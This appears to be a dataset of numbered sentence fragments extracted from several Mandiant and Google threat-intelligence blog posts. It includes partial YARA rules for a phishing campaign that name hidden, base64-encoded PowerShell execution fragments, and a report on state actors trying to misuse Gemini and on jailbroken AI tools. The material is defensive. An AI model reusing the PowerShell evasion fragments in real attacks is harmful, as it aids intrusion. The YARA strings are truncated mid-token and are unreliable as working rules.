CAND_02346,R047,19,R047_P0001,R047_S000073,  (uint16(0) != 0x5A4 ) and ( all of ($wsobj*) an or all of ($wsobj*) an ) ) }
CAND_02347,R047,19,R047_P0002,R047_S000074,"rule FE_LEGALSTRIKE_MACRO_2 { meta:version="".1"" filetype=""MACRO"" author=""Ian.Ahl@fireeye.com @TekDe date=""2017-06-02"" description=""This rule was written strings: // Setting the environment $env1 = ""Arch = Environ(\""PROCESSO $env2 = ""windir = Environ(\""windir $env3 = ""windir + \""\\syswow64\\wi // powershell command fragments $ps1 = ""-NoP"" ascii wide $ps2 = ""-NonI"" ascii wide $ps3 = ""-W Hidden"" ascii wide $ps4 = ""-Command"" ascii wide $ps5 = ""New-Object IO.StreamReader $ps6 = ""IO.Compression.DeflateStre $ps7 = ""IO.MemoryStream"" ascii wid $ps8 = "",$([Convert]::FromBase64St $ps9 = ""ReadToEnd();"" ascii wide $psregex1 = /\W\w+\s+\s\"".+\""/ condition: ( Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 19/22"
CAND_02348,R047,20,R047_P0001,R047_S000075,"( (uint16(0) != 0x5A4 ) and ( all of ($env*) and or all of ($env*) and ) ) } rule FE_LEGALSTRIKE_RTF { meta: version="".1"" filetype=""MACRO"" author=""joshua.kim@FireEye.com"" date=""2017-06-02"" description=""Rtf Phishing Campaig strings: $header = ""{\\rt"" $lnkinfo = ""4c0069006e006b0049006 $encoded1 = ""4f4c45324c696e6b"" $encoded2 = ""52006f006f0074002000 $encoded3 = ""4f0062006a0049006e00 $encoded4 = ""4f006c0065"" $http1 = ""68{"" $http2 = ""74{"" $http3 = ""07{"" // 2bunny.com $domain1 = ""32{\\"" $domain2 = ""62{\\"" $domain3 = ""75{\\"" $domain4 = ""6e{\\"" $domain5 = ""79{\\"" $domain6 = ""2e{\\"" Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 20/22"
CAND_02349,R047,21,R047_P0001,R047_S000076,"Related articles Threat Intelligence By Google Threat Intelligence Group • 17- minute read Threat Intelligence By Mandiant • 29-minute read   $domain7 = ""63{\\"" $domain8 = ""6f{\\"" $domain9 = ""6d{\\"" $datastore = ""\\*\\datastore"" condition: $header at 0 and all of them } Acknowledgements Joshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco, Christopher Glyer Posted in Threat Intelligence—Security & Identity Vulnerability Discovery and Exploitation Trends in the AI Era Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 21/22"
CAND_02350,R047,22,R047_P0001,R047_S000077,"Follow us Google Cloud Google Cloud Products Privacy Terms Help ‪English‬ Threat Intelligence By Mandiant • 18-minute read Threat Intelligence By Mandiant • 15-minute read ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 22/22"
CAND_02351,R048,2,R048_P0001,R048_S000002,"Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 2/16"
CAND_02352,R048,3,R048_P0001,R048_S000003,"Threat Intelligence Going ATOMIC: Clustering and Associating Attacker Activity at Scale March 12, 2019 Mandiant Written by: Matt Berninger At FireEye, we work hard to detect, track, and stop attackers."
CAND_02353,R048,3,R048_P0001,R048_S000005,This knowledge is built up over hundreds of investigations and thousands of hours of analysis each year.
CAND_02354,R048,3,R048_P0001,R048_S000006,"At the time of publication, we have 50 APT or FIN groups, each of which have distinct characteristics."
CAND_02355,R048,3,R048_P0001,R048_S000007,We have also collected thousands of uncharacterized 'clusters' of related activity about which we have not yet made any formal attribution claims.
CAND_02356,R048,3,R048_P0001,R048_S000008,"While Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 3/16"
CAND_02357,R048,4,R048_P0001,R048_S000009,"unattributed, these clusters are still useful in the sense that they allow us to group and track associated activity over time."
CAND_02358,R048,4,R048_P0001,R048_S000010,"However, as the information we collect grows larger and larger, we realized we needed an algorithmic method to assist in analyzing this information at scale, to discover new potential overlaps and attributions."
CAND_02359,R048,4,R048_P0001,R048_S000011,"This blog post will outline the data we used to build the model, the algorithm we developed, and some of the challenges we hope to tackle in the future."
CAND_02360,R048,4,R048_P0001,R048_S000018,Figure 1 shows a fabricated example with the various 'topics' broken out.
CAND_02361,R048,5,R048_P0001,R048_S000020,"such as 'Malware' – we have various 'terms', which have associated counts."
CAND_02362,R048,5,R048_P0001,R048_S000024,"However, as we collect increasingly more data about attacker activities, this manual analysis becomes a bottleneck."
CAND_02363,R048,5,R048_P0001,R048_S000025,"Clusters risk going unanalyzed, and potential associations and attributions could slip through the cracks."
CAND_02364,R048,6,R048_P0001,R048_S000028,The model we developed began with the following goals: 1.
CAND_02365,R048,6,R048_P0001,R048_S000029,"Create a single, interpretable similarity metric between groups 2."
CAND_02366,R048,6,R048_P0001,R048_S000031,"Discover new potential matches Figure 2: Example documents highlighting observed term overlaps between two groups The Model This model uses a document clustering approach, familiar in the data science realm and often explained in the context of grouping books or movies."
CAND_02367,R048,6,R048_P0001,R048_S000032,"Applying the approach to our structured documents about each group, we can evaluate similarities between groups at scale."
CAND_02368,R048,6,R048_P0001,R048_S000033,"First, we decided to model each topic individually."
CAND_02369,R048,6,R048_P0001,R048_S000034,"This decision means that each topic will result in its own measure of similarity between groups, which will ultimately be aggregated to produce a holistic similarity measure."
CAND_02370,R048,6,R048_P0001,R048_S000035,Here is how we apply this to our documents.
CAND_02371,R048,6,R048_P0001,R048_S000036,"Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 6/16"
CAND_02372,R048,7,R048_P0001,R048_S000040,2.
CAND_02373,R048,7,R048_P0001,R048_S000042,"This approach rewards distinctive terms such as custom malware families – which may appear for only a handful of groups – and down-weights common things such as 'spear-phishing', which appear for the vast majority of groups."
CAND_02374,R048,7,R048_P0001,R048_S000048,"Unique values have a much higher IDF, and thus result in higher values."
CAND_02375,R048,8,R048_P0001,R048_S000052,"Within each topic space, we can then evaluate the similarity of various groups using another method – Cosine Similarity."
CAND_02376,R048,8,R048_P0001,R048_S000056,"As seen in Figure 4, to evaluate two groups' usage of malware, we plot their malware vectors and see if they are pointing in the same direction."
CAND_02377,R048,9,R048_P0001,R048_S000059,"Figure 4: Simplified breakdown of Cosine Similarity metric when applied to two groups in the malware 'space' One of the nice things about this approach is that large and small vectors are treated the same – thus, a new, relatively small UNC cluster pointing in the same direction as a well-documented APT group will still reflect a high level of similarity."
CAND_02378,R048,9,R048_P0001,R048_S000060,"This is one of the primary use cases we have, discovering new clusters of activity with high similarity to already established groups."
CAND_02379,R048,9,R048_P0001,R048_S000064,The question then becomes: What is the best way to build this final similarity?
CAND_02380,R048,10,R048_P0001,R048_S000066,"The simplest approach is to take an average, and at first that’s exactly what we did."
CAND_02381,R048,10,R048_P0001,R048_S000069,"Malware and methodologies should be more important than say, server locations or target industries...right?"
CAND_02382,R048,10,R048_P0001,R048_S000072,"Building a Labeled Dataset At first our concept seemed straightforward: We would find a large dataset of labeled pairs, and then fit a regression model to accurately classify them."
CAND_02383,R048,11,R048_P0001,R048_S000077,"Figure 6: Example Linear regression plot—in reality we used a Logistic Regression, but showing a linear model to demonstrate the intuition Then, we use that same function to predict the aggregate similarity of un-labeled pairs (Figure 7)."
CAND_02384,R048,11,R048_P0001,R048_S000081,"As a labeled dataset, these pairs were woefully Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 11/16"
CAND_02385,R048,12,R048_P0001,R048_S000082,insufficient for any rigorous evaluation of the approach.
CAND_02386,R048,12,R048_P0001,R048_S000085,"We could therefore label any two samples that came from the same group as definitely similar, and any two from separate groups as not similar (Figure 8)."
CAND_02387,R048,12,R048_P0001,R048_S000086,This gave us the ability to synthetically generate the labeled dataset we desperately needed.
CAND_02388,R048,12,R048_P0001,R048_S000087,"Then, using a linear regression model, we were able to elegantly solve this 'weighted average' problem rather than depend on subjective guesses."
CAND_02389,R048,12,R048_P0001,R048_S000088,"Figure 8: Example similarity testing with 'fake' clusters derived from known APT groups Additionally, these synthetically created clusters gave us a dataset upon which to test various iterations of the model."
CAND_02390,R048,12,R048_P0001,R048_S000090,What if we change the way we capture terms?
CAND_02391,R048,12,R048_P0001,R048_S000091,"Using a large labeled dataset, we can now benchmark and evaluate performance as we update and improve the model."
CAND_02392,R048,13,R048_P0001,R048_S000098,This can help us identify overfitting issues as well.
CAND_02393,R048,13,R048_P0001,R048_S000102,"However, our model is able to present probable merges and similarities to analysts on demand, and thus can assist them in discovery."
CAND_02394,R048,13,R048_P0001,R048_S000103,"Upon deploying this to our systems in December 2018, we immediately found benefits."
CAND_02395,R048,14,R048_P0001,R048_S000107,"Related articles Like all models, this one has its weaknesses and we are already working on improvements."
CAND_02396,R048,14,R048_P0001,R048_S000110,"Most of all, we have not yet fully incorporated the 'time of activity' and instead rely on 'time of recording'."
CAND_02397,R048,14,R048_P0001,R048_S000111,"This introduces a lag in our representation, which makes time-based analysis difficult."
CAND_02398,R048,14,R048_P0001,R048_S000117,"Most of all, we look forward to the modeling efforts that help us profile, attribute, and stop attackers."
CAND_02399,R048,15,R048_P0001,R048_S000119,"Follow us Threat Intelligence By Google Threat Intelligence Group • 17- minute read Threat Intelligence By Mandiant • 29-minute read Threat Intelligence By Mandiant • 18-minute read Threat Intelligence By Mandiant • 15-minute read Vulnerability Discovery and Exploitation Trends in the AI Era Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 15/16"
CAND_02400,R048,16,R048_P0001,R048_S000120,"Google Cloud Google Cloud Products Privacy Terms Help ‪English‬ Contact sales Get started for free Cloud Blog 10/6/26, 10:31 AM Going ATOMIC: Clustering and Associating Attacker Activity at Scale | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/clustering-and-associating-attacker-activity-at-scale?utm_source=chatgpt.com 16/16"
CAND_02401,R049,1,R049_P0001,R049_S000002,"The Nameless APT December 7, 2022 Mandiant Written by: Kyle Chrzanowski, Roshini Jagadam Time is an extremely persistent threat actor observed across all industries."
CAND_02402,R049,1,R049_P0001,R049_S000003,The group has conducted the longest running and highest volume campaigns observed among any group to date.
CAND_02403,R049,1,R049_P0001,R049_S000004,Time appears to have formidable and global capabilities and often has secondary impacts that lead to other successful threat actor campaigns.
CAND_02404,R049,1,R049_P0001,R049_S000005,Time has not been observed asking for payment and motivations are yet unknown.
CAND_02405,R049,1,R049_P0001,R049_S000006,Threat actors are increasing in number and sophistication.
CAND_02406,R049,1,R049_P0001,R049_S000007,"They can innovate and launch attacks without the need to submit 3-year Contact sales Get started for free Cloud Blog 10/6/26, 10:33 AM Accelerated Cyber Security Transformation: Time."
CAND_02407,R049,1,R049_P0001,R049_S000008,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 3/12
CAND_02408,R049,2,R049_P0001,R049_S000009,"roadmaps, gain multiple levels of approvals, go through a change advisory board, schedule downtime windows, or go through lengthy procurement processes."
CAND_02409,R049,2,R049_P0001,R049_S000010,"Defenders are intent on reducing the risk and impact of a successful attack and are increasingly focused on improving their security posture; however, they are failing to improve the speed at which they can defend against threat actors."
CAND_02410,R049,2,R049_P0001,R049_S000011,"As seen in Figure 1, an organization losing the battle to the Nameless APT will be slower to respond and manage risk."
CAND_02411,R049,2,R049_P0001,R049_S000012,"Thus, the average risk over time will be higher, the maximum risk will be higher, and the risk will be fully remediated more slowly."
CAND_02412,R049,2,R049_P0001,R049_S000013,"Figure 1: Risk of a sample organization that is slow to respond to a newly identified risk (left), versus an organization that can respond quickly (right) Security teams are expected to quickly implement detections/preventions for new and novel attacks while already buried in technical debt fighting the degradation of existing security controls, all while being available to drop everything as soon as there is a security incident."
CAND_02413,R049,2,R049_P0001,R049_S000014,"Even with clear and concise objectives, many organizations are not able to complete this work fast enough to defend against the modern and high-speed attack Contact sales Get started for free Cloud Blog 10/6/26, 10:33 AM Accelerated Cyber Security Transformation: Time."
CAND_02414,R049,2,R049_P0001,R049_S000015,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 4/12
CAND_02415,R049,3,R049_P0001,R049_S000016,lifecycle.
CAND_02416,R049,3,R049_P0001,R049_S000017,"Some common reasons why organizations say they don’t get work done fast enough include: There’s not enough headcount There’s not enough budget There’s not the right toolset There are not enough hours in the day There are constant interruptions While these common causes are valid, the reasons organizations struggle to keep up with the security landscape often stem from a root issue:"
CAND_02417,R049,3,R049_P0002,R049_S000018,"The way organizations work today doesn’t allow them to get work done fast enough.” Understanding Slow Work To defend against Time and fix the core issue, we first need to understand what causes slow work and define a few key terms that help describe it."
CAND_02418,R049,3,R049_P0002,R049_S000019,"Queue Time (Q/T): The time something waits to be worked on (e.g., an access request waiting to be approved, a SIEM alert that hasn’t been responded to, an email waiting in queue)."
CAND_02419,R049,3,R049_P0002,R049_S000021,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 5/12
CAND_02420,R049,4,R049_P0001,R049_S000022,"Processing Time (P/T): The hands-on touch time to do the actual work that turns an input into an output (e.g., think about and create a SIEM rule, patch a server, conduct an access review)."
CAND_02421,R049,4,R049_P0001,R049_S000023,"Lead Time (LT): The time from the moment work is ready to be worked on by an individual, team, or department until it has been completed and made available to the next person or team in the value stream (i.e., queue time plus processing time) ."
CAND_02422,R049,4,R049_P0001,R049_S000024,"Process Over Activity (POA): The measure of flow within a system, expressed as a percentage."
CAND_02423,R049,4,R049_P0001,R049_S000025,"It is calculated by dividing total processing time (P/T) over total lead time (LT) (e.g., a request with LT of 5 days and a P/T of 1 day has a POA of 1/5 = 20%)."
CAND_02424,R049,4,R049_P0001,R049_S000026,"Percent Complete & Accurate (%C/A): A measure of the amount of waste and/or re-work within a process obtained by asking downstream customers what percentage of the time they receive work that’s “usable as is” without having to correct the information, add missing information, or clarify information."
CAND_02425,R049,4,R049_P0001,R049_S000028,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 6/12
CAND_02426,R049,5,R049_P0001,R049_S000029,"Queue Time (Q/T), Lead Time (LT), and Process Over Activity (POA) metrics Queue Time (Q/T) typically takes up the highest percentage of the total time necessary to complete work and deliver value."
CAND_02427,R049,5,R049_P0001,R049_S000030,"In the example in Figure 2, it takes over 5 full business days to implement a configuration into production even though the Process Time (P/T) is only 1.5 hours."
CAND_02428,R049,5,R049_P0001,R049_S000031,Organizations new to implementing an accelerated cyber program may be trying to measure and improve total work throughput without considering the aforementioned flow metrics.
CAND_02429,R049,5,R049_P0001,R049_S000035,"Figure 3: Security work flowing through a system where the circles represent individual work items and tasks, the length of the pipe represents the total time it takes to complete work, and the width of the pipe Contact sales Get started for free Cloud Blog 10/6/26, 10:33 AM Accelerated Cyber Security Transformation: Time."
CAND_02430,R049,6,R049_P0001,R049_S000038,The focus for organizations responding to the Nameless APT should not be to create a wider pipe where larger traffic jams can happen—it should be to first decrease the length of the pipe and reduce the traffic jams within the pipe.
CAND_02431,R049,6,R049_P0001,R049_S000039,Using the metrics in Figure 2 can help with this.
CAND_02432,R049,6,R049_P0001,R049_S000040,"As the total Lead Time (LT) decreases, the time it takes to respond to a threat actor (total length of the pipe) gets shorter."
CAND_02433,R049,6,R049_P0001,R049_S000041,"As Process over Activity (POA) increases, the gaps and spaces between work items is reduced."
CAND_02434,R049,6,R049_P0001,R049_S000042,"As Queue Time (Q/T) is reduced, the total Work In Progress (WIP) is reduced and the traffic jam in the middle of the pipe begins to clear up."
CAND_02435,R049,6,R049_P0001,R049_S000043,"As Percent Complete and Accurate (%C/A) is increased, the work stuck to the side of the pipe is reduced and the traffic jam further decreases in size or is removed entirely."
CAND_02436,R049,6,R049_P0001,R049_S000044,What Does an Accelerated Cyber Security Transformation Look Like?
CAND_02437,R049,6,R049_P0001,R049_S000045,"Contact sales Get started for free Cloud Blog 10/6/26, 10:33 AM Accelerated Cyber Security Transformation: Time."
CAND_02438,R049,6,R049_P0001,R049_S000046,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 8/12
CAND_02439,R049,7,R049_P0001,R049_S000047,It is nearly impossible for cyber security personnel to keep up with the security landscape while continuing traditional ways of working.
CAND_02440,R049,7,R049_P0001,R049_S000048,Organizations that adopt an Accelerated Cyber Security Program defend against the Nameless APT by changing their mindset: the way they even think about “Work”.
CAND_02441,R049,7,R049_P0001,R049_S000049,"These organizations understand that no value has been provided until work is in production and that continuously improving the speed at which they’re able to identify, prioritize and add value is equally or more important than the work itself."
CAND_02442,R049,7,R049_P0001,R049_S000050,"Figure 4: An example workflow of value in an organization from requirements capture to production As illustrated in Figure 4, organizations with an Accelerated Cyber Security Program manage, plan and control work through several stages and aim to continuously improve the speed at which they are able to select and complete work."
CAND_02443,R049,7,R049_P0001,R049_S000051,"With this perspective and approach, organizations can improve the quality, speed and efficiency of their planned work in order to continuously keep up with the security landscape."
CAND_02444,R049,7,R049_P0001,R049_S000052,"So, instead of focusing solely on attempting to increase the amount of work that is completed, they improve the speed at which they deliver value and manage risk."
CAND_02445,R049,7,R049_P0001,R049_S000054,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 9/12
CAND_02446,R049,8,R049_P0001,R049_S000056,"Each additional step increases the maturity of an Accelerated Cyber Security Program and though it requires significant investment and planning to execute, it enables and increases the effectiveness of nearly every aspect of an organization’s overall Cyber Security Program."
CAND_02447,R049,8,R049_P0001,R049_S000057,Stay tuned for future blog posts digging in on each of these topics in further detail.
CAND_02448,R049,8,R049_P0001,R049_S000059,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 10/12
CAND_02449,R049,9,R049_P0001,R049_S000060,"Follow us Threat Intelligence By Google Threat Intelligence Group • 17- minute read Threat Intelligence By Mandiant • 29-minute read Threat Intelligence By Mandiant • 18-minute read Threat Intelligence By Mandiant • 15-minute read Vulnerability Discovery and Exploitation Trends in the AI Era Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure Contact sales Get started for free Cloud Blog 10/6/26, 10:33 AM Accelerated Cyber Security Transformation: Time."
CAND_02450,R049,9,R049_P0001,R049_S000061,The Nameless APT | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/time-nameless-apt/?utm_source=chatgpt.com 11/12
CAND_02451,R050,1,R050_P0001,R050_S000001,"Threat Intelligence Adversarial Misuse of Generative AI January 30, 2025 Google Threat Intelligence Group Rapid advancements in artificial intelligence (AI) are unlocking new possibilities for the way we work and accelerating innovation in science, technology, and beyond."
CAND_02452,R050,2,R050_P0001,R050_S000009,"Our analysis was grounded by the expertise of Google's Threat Intelligence Group (GTIG), which combines decades of experience tracking threat actors on the front lines and protecting Google, our users, and our customers from government-backed attackers, targeted 0-day exploits, coordinated information operations (IO), and serious cyber crime networks."
CAND_02453,R050,4,R050_P0001,R050_S000028,Examples include sockpuppet accounts and comment brigading.
CAND_02454,R050,6,R050_P0001,R050_S000043,"Iranian APT actors were the heaviest users of Gemini, using it for a wide range of purposes."
CAND_02455,R050,6,R050_P0001,R050_S000048,Gemini's safety and security measures restricted content that would enhance adversary capabilities as observed in this dataset.
CAND_02456,R050,6,R050_P0001,R050_S000049,"Gemini provided assistance with common tasks like creating content, summarizing, explaining complex concepts, and even simple coding tasks."
CAND_02457,R050,7,R050_P0001,R050_S000052,"Threat actors attempted unsuccessfully to use Gemini to enable abuse of Google products, including researching techniques for Gmail phishing, stealing data, coding a Chrome infostealer, and bypassing Google's account verification methods."
CAND_02458,R050,7,R050_P0001,R050_S000056,"However, current LLMs on their own are unlikely to enable breakthrough capabilities for threat actors."
CAND_02459,R050,7,R050_P0001,R050_S000057,"We note that the AI landscape is in constant flux, with new AI models and agentic systems emerging daily."
CAND_02460,R050,7,R050_P0001,R050_S000060,"One way is attempting to leverage LLMs to accelerate their campaigns (e.g., by generating code for malware or content for phishing emails)."
CAND_02461,R050,8,R050_P0001,R050_S000070,Gemini responded with safety fallback responses and declined to follow the threat actor's instructions.
CAND_02462,R050,10,R050_P0001,R050_S000086,"Instead, the responses consisted of safety-guided content and generally helpful, neutral advice about coding and cybersecurity."
CAND_02463,R050,10,R050_P0001,R050_S000089,"Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 12/52"
CAND_02464,R050,11,R050_P0001,R050_S000094,"North Korea: North Korean APT actors used Gemini to support several phases of the attack lifecycle, including researching potential infrastructure and free hosting providers, reconnaissance on target organizations, payload development, and assistance with malicious scripting and evasion techniques."
CAND_02465,R050,12,R050_P0001,R050_S000099,"Their Gemini use focused on coding tasks, including converting publicly available malware into another coding language and adding encryption functions to existing code."
CAND_02466,R050,12,R050_P0001,R050_S000100,Google analyzed Gemini activity associated with known APT actors and identified APT groups from more than 20 countries that used Gemini.
CAND_02467,R050,13,R050_P0001,R050_S000104,We observed APT actors use Gemini attempting to support all phases of the attack lifecycle.
CAND_02468,R050,13,R050_P0001,R050_S000105,"Attack Lifecycle Topics of Gemini Usage Reconnaissance Attacker gathers information about the target Iran Recon on experts, international defense organizations, government organizations Topics related to Iran-Israel proxy conflict North Korea Research on companies across multiple sectors and geos Recon on US military and operations in South Korea Research free hosting providers China Research on US military, US-based IT service providers Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 15/52"
CAND_02469,R050,18,R050_P0001,R050_S000113,"Their use reflected strategic Iranian interests including research focused on defense organizations and experts, defense systems, foreign governments, individual dissidents, the Israel-Hamas conflict, and social issues in Iran."
CAND_02470,R050,18,R050_P0001,R050_S000114,"At a Glance: Iranian APT Actors Using Gemini Over 10 Iran-backed groups observed using Gemini Google abuse-focused use cases: Researching methods for extracting data from Android devices, including SMS messages, accounts, contacts, and social media accounts Example use cases: Coding and scripting PowerShell and Linux commands Python code for website scraping Debugging and improving a Ghidra script Developing PHP scripts to collect and store user IP addresses and browser Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 20/52"
CAND_02471,R050,20,R050_P0001,R050_S000117,APT42's Gemini activity reflected the group's focus on crafting successful phishing campaigns.
CAND_02472,R050,21,R050_P0001,R050_S000126,Research Into Military and Weapons Systems APT42 also appears to have used Gemini's translation and explanation functions to better understand publicly available information on defense systems.
CAND_02473,R050,25,R050_P0001,R050_S000141,Other actors used Gemini for help troubleshooting Chinese character encoding issues in smbclient and how to record passwords on the VMware vCenter.
CAND_02474,R050,26,R050_P0001,R050_S000146,"For example, a PRC APT actor used Gemini to break down how to use the graph database Nebula Graph."
CAND_02475,R050,26,R050_P0001,R050_S000155,"In a helpful tone, the responses provided publicly available details that would be widely known about the topic, while Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 28/52"
CAND_02476,R050,27,R050_P0001,R050_S000158,"They also used Gemini to research topics of strategic interest to the North Korean government, such as South Korean nuclear technology and cryptocurrency."
CAND_02477,R050,30,R050_P0001,R050_S000164,"specific jobs, and asked about jobs on LinkedIn."
CAND_02478,R050,30,R050_P0001,R050_S000170,"They likely use AI applications to augment malicious operations and improve efficiency and capabilities, and for producing content to support their campaigns, such as phishing lures and profile photos for fake personas."
CAND_02479,R050,31,R050_P0001,R050_S000177,"Based on the capabilities of these platforms and historical APT43 activities, it is possible these applications could be used in the creation of rapport-building emails, lure content, and malicious PowerShell and scripting efforts."
CAND_02480,R050,31,R050_P0001,R050_S000179,"GTIG has identified APT43 actors accessing multiple publicly available AI image generation tools, including tools used for image manipulation and creating realistic-looking human portraits."
CAND_02481,R050,33,R050_P0001,R050_S000191,The same group also asked Gemini to generate a robots.txt file to block crawlers and an .htaccess file to redirect all URLs except CSS extensions.
CAND_02482,R050,33,R050_P0001,R050_S000196,"Russian Government- Backed Actors During the period of analysis, we observed limited use of Gemini by Russia-backed APT actors."
CAND_02483,R050,33,R050_P0001,R050_S000198,The reasons for this low engagement are unclear.
CAND_02484,R050,35,R050_P0001,R050_S000205,"Financially Motivated Actors Using LLMs Threat actors in underground marketplaces are advertising ways to bypass security guardrails to help LLMs with malware development, phishing, and other malicious tasks."
CAND_02485,R050,35,R050_P0001,R050_S000209,"Examples include FraudGPT, which has been advertised on Telegram as having no limitations, and WormGPT, a privacy focused, ""uncensored"" LLM capable of developing malware."
CAND_02486,R050,35,R050_P0001,R050_S000210,Financially motivated actors are using LLMs to help augment business email compromise (BEC) operations.
CAND_02487,R050,36,R050_P0001,R050_S000218,"China: Pro-China IO actors used Gemini primarily for general research on various topics, including a variety of topics of strategic interest to the Chinese government."
CAND_02488,R050,36,R050_P0001,R050_S000220,"They also used Gemini to research current events and politics, and in a few cases, they used Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 38/52"
CAND_02489,R050,37,R050_P0001,R050_S000221,Gemini to generate articles or content on specific topics.
CAND_02490,R050,37,R050_P0001,R050_S000225,"IO actors used Gemini for research, content generation including developing personas and messaging, translation and localization, and to find ways to increase their reach."
CAND_02491,R050,39,R050_P0001,R050_S000240,"At a Glance: Iran-Linked IO Actors Using Gemini Eight Iran-linked IO groups observed using Gemini Example use cases: Content creation - text Generate article titles Generate SEO-optimized content and titles Draft a report critical of Bahrain Draft titles and hashtags in English and Farsi for videos that are catchy or create urgency to watch the content Draft titles and descriptions promoting Islam Translation - content in / out of native language Translate into Farsi- provided texts about a variety of topics, including the Iranian election, human rights, international law, Islam, and other topics Translate Farsi-language idioms and proverbs to other languages Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 41/52"
CAND_02492,R050,42,R050_P0001,R050_S000243,PRC-Linked Information Operations Actors IO actors linked to the People's Republic of China (PRC) used Gemini primarily for general research on a wide variety of topics.
CAND_02493,R050,43,R050_P0001,R050_S000250,"countries and China Research on topics sensitive to the the Chinese government (e.g., five poisons) Research on Taiwanese politicians and their actions toward China Research on US politics and political figures and their attitudes on China Research foreign press coverage about China Summarize key takeaways from a video General research - technology Compare functionality and features of different social media platforms Explain technical concepts and suggestions for useful tools Translation - content in / out of native language Translate and summarize text between Chinese and other languages Content creation - text Draft articles on topics such as the use of AI and social movements in specific regions Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 45/52"
